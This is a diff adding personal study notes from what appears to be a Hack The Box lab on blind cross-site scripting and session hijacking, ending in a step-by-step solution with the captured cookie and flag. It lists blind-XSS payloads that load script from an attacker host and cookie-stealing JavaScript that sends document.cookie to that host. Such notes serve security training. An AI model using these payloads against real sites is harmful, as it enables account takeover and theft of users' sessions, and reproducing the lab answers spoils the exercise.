@@ -15,3 +15,87 @@ Blind XSS vulnerabilities usually occur with forms only accessible by certain us
 * HTTP User-Agent header
 
 Let's run the test on the web application on (/hijacking) in the server at the end of this section. We see a User Registration page with multiple fields, so let's try to submit a test user to see how the form handles the data:
+
+
+SO simialr to last module we are going to need to test the parameters to see what pops. BUT since we dont have access to admin dash we will need to host our own server to see the alert pop to -> 
+
+However, this introduces two issues:
+
+1. How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
+2. How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?
+
+In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
+
+EXAMPLE: <script src="http://OUR_IP/script.js"></script>
+
+So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
+
+EXAMPLE: <script src="http://OUR_IP/username"></script> 
+
+The following are a few examples we can use from PayloadsAllTheThings ( https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss ) :
+
+EXAMPLES: 
+
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+
+Before we start sending payloads, we need to start a listener on our VM, using netcat or php as shown in a previous section: 
+
+and just like last section we will make a /tmp/tmpserver directory and start server -> 
+
+MJBUCKNER@htb[/htb]$ mkdir /tmp/tmpserver
+MJBUCKNER@htb[/htb]$ cd /tmp/tmpserver
+MJBUCKNER@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+
+Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:
+
+EXAMPLES:
+
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+...SNIP...
+
+
+Session Hijacking
+Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
+
+A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
+
+There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings( https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc )  :
+
+
+EXAMPLES: 
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie; 
+
+We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
+
+EXAMPLE: new Image().src='http://OUR_IP/index.php?c='+document.cookie
+
+
+Now, we can change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload):
+
+EXAMPLE: <script src=http://OUR_IP/script.js></script>
+
+
+
+CHALLENGE: 10.129.126.60
+
+
+QUESTION 1 - Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag. - HTB{4lw4y5_53cur3_y0ur_c00k135} 
+1) http://10.129.126.60/hijacking/
+2) start nc listener -> nc -nlvp 4444 
+3) "><script src=http://10.10.15.252:4444/script.js></script>
+4) we see that the profile picture url parameter is vulnerable from the feedback we got from the nc listener 
+5) set up /tmp/tmpserver add script.js and index.php scripts & php -S 0.0.0.0:8080 
+6) "><script src=http://10.10.15.252:8080/script.js></script> 
+7) i actually got the cookie from the nc listener -> GET /index.php?c=cookie=c00k1355h0u1d8353cu23d 
+8) go to http://10.129.126.60/hijacking/login.php
+9) right click for inspector -> storage -> cookies -> enter c00k1355h0u1d8353cu23d for value and cookie for name -> refresh page 
+10) HTB{4lw4y5_53cur3_y0ur_c00k135} 
+
